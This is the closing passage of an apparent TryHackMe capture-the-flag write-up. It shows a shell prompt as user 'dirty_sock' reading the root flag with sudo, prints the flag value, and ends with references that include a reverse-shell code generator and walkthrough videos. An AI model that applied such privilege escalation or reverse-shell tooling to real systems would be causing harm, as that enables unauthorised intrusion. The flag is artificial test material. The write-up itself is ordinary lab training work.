dirty_sock@petshop:/dev/shm$ sudo cat /root/root.txt
THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}
```

## Reference
- [Resh App - gives reverse shell code](https://resh.vercel.app/)
- [xct's Video](https://www.youtube.com/watch?v=VWkNOFUX2p8)
- [John Hammond's Video](https://www.youtube.com/watch?v=g2CnIgjHeX8)
